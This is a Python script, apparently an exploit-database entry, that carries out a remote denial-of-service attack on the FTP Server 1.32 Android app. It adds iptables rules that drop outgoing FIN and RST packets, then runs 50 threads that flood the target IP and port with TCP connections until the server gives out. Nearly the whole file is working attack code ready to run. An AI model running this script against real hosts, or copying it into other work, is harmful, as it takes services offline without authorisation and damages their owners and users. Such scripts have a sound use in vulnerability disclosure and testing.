#!/usr/bin/env python
#coding: utf-8

# ************************************************************************
# *                Author: Marcelo Vázquez (aka s4vitar)                 *
# *           FTP Server 1.32 Remote Denial of Service (DoS)             *
# ************************************************************************

# Exploit Title: FTP Server 1.32 Remote Denial of Service (DoS)
# Date: 2019-02-26
# Exploit Author: Marcelo Vázquez (aka s4vitar)
# Vendor: The Olive Tree
# Software Link: https://play.google.com/store/apps/details?id=com.theolivetree.ftpserver
# Category: Mobile Apps
# Version: <= FTP Server 1.32
# Tested on: Android

import socket, random, string, signal, ssl, argparse, sys
from time import sleep
from threading import Thread, active_count
from os import system, geteuid

if geteuid() != 0:
    print("\nPlease, run %s as root...\n" % sys.argv[0])
    sys.exit()

stop = False

def signal_handler(signal, frame):
    global stop
    stop = True

def spam(target_ip, port):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        try:
            s.connect((target_ip, port))
        except:
            pass
        if stop == True:
            break

if __name__ == '__main__':

    signal.signal(signal.SIGINT, signal_handler)

    if len(sys.argv) != 3:
        print "\nUsage: python " + sys.argv[0] + " <ip-address> <port>\n"
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2])

    target_ip = socket.gethostbyname(target)

    system('iptables -A OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP' %( target_ip, port ))
    system('iptables -A OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP' %( target_ip, port ))

    threads = []

    payload = ''

    for i in xrange(0,50):
        t = Thread(target=spam, args=(target_ip, port,))
        threads.append(t)
        t.start()

    while True:

        if active_count() == 1 or stop == True:

            system('iptables -D OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP' %( target_ip, port ))
            system('iptables -D OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP' %( target_ip, port ))
            print("")
            break